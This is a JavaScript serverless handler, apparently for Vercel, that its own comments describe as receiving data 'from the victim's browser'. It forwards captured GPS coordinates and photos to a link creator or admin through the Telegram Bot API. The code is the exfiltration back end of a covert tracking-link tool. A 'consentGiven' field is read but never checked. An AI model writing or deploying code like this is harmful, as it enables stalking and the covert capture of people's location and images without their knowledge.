// This is where data comes from the victim's browser
// It looks up who created the link and forwards the data to them

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;

  const { linkId, type, photoUrl, coords, consentGiven } = data;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    // Step 1: Get the link's telegram chat_id from your bot
    // You need a way to store linkId → chatId mapping
    // Option A: Query your bot's database via an API
    // Option B: Send to admin who forwards it (current approach)
    // Option C: Store mapping in Vercel KV / Upstash Redis

    // ==========================================
    // SIMPLE APPROACH: Send to admin, admin forwards
    // ==========================================
    
    let message = '';
    let hasPhoto = false;
    let photoFileId = null;

    if (type === 'location' && coords) {
      message = `📍 **Location Captured!**\n\n`;
      message += `Latitude: \`${coords.lat}\`\n`;
      message += `Longitude: \`${coords.lng}\`\n`;
      message += `🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})\n`;
      message += `⏰ Time: ${new Date().toISOString()}\n`;
      message += `🔗 Link ID: \`${linkId}\``;
      
      // Send location to admin (who will forward to the creator)
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: ADMIN_ID, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    if (type === 'photo' && photoUrl) {
      hasPhoto = true;
      message = `📸 **Photo Captured!**\n\n`;
      message += `⏰ Time: ${new Date().toISOString()}\n`;
      message += `🔗 Link ID: \`${linkId}\``;
      
      // Send photo to admin
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_ID,
          photo: photoUrl,
          caption: message,
          parse_mode: 'Markdown'
        })
      });
    }

    // ==========================================
    // BETTER APPROACH: Store mapping and send directly
    // ==========================================
    // If you set up Vercel KV (Redis), use this instead:
    /*
    const creatorChatId = await kv.get(`link:${linkId}:creator`);
    if (creatorChatId) {
      if (type === 'photo') {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: creatorChatId,
            photo: photoUrl,
            caption: `📸 Photo captured from your test link!`,
          })
        });
      }
      if (type === 'location') {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: creatorChatId,
            text: `📍 Location captured: ${coords.lat}, ${coords.lng}`,
          })
        });
      }
    }
    */

    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error processing data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}
